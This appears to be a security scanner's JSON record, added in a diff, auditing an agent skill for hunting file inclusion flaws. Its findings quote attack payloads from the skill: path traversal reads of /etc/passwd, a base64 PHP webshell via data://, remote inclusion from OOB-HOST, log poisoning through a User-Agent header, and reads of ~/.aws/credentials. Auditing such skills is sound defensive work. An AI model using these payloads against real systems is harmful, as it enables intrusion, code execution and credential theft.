@@ -1,0 +1,155 @@
+{
+  "id": "sickn33__agentic-awesome-skills__plugins~agentic-awesome-skills-claude~skills~hunt-lfi",
+  "owner": "sickn33",
+  "repo": "agentic-awesome-skills",
+  "path": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi",
+  "name": "hunt-lfi",
+  "description": "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path",
+  "stars": 49315,
+  "category": "coding",
+  "commit": "828257c3037dc7c3c3ec987decc5a603025a0ce5",
+  "contentHash": "935dc74c5a1c686210c19572e3d22757fdb2484669b63e898eb436d2ed373c48",
+  "repoCreatedAt": "2026-01-14T17:48:09Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 110,
+        "excerpt": "cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 118,
+        "excerpt": "?file=../../../etc/passwd",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 130,
+        "excerpt": "?file=..\\..\\..\\windows\\win.ini",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 137,
+        "excerpt": "?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 149,
+        "excerpt": "python3 php_filter_chain_generator.py --chain '<?php system($_GET[\"c\"]); ?>'",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 163,
+        "excerpt": "?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 177,
+        "excerpt": "?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 188,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"User-Agent: <?php system(\\$_GET['c']); ?>\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 188,
+        "excerpt": "curl -s \"https://$TARGET/\" -H \"User-Agent: <?php system(\\$_GET['c']); ?>\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 200,
+        "excerpt": "?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 215,
+        "excerpt": "ffuf -u \"https://$TARGET/page.php?file=FUZZ\" -w ~/wordlists/lfi.txt -mc all -fr \"not found\"",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 268,
+        "excerpt": "| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 289,
+        "excerpt": "**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<coll",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-awesome-skills-claude/skills/hunt-lfi/SKILL.md",
+        "line": 311,
+        "excerpt": "cat scope.txt  # target list from the authorized engagement brief",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 11,
+      "network": 2,
+      "reads-secrets": 1
+    },
+    "score": 82,
+    "band": "low",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "828257c3037dc7c3c3ec987decc5a603025a0ce5",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 82,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
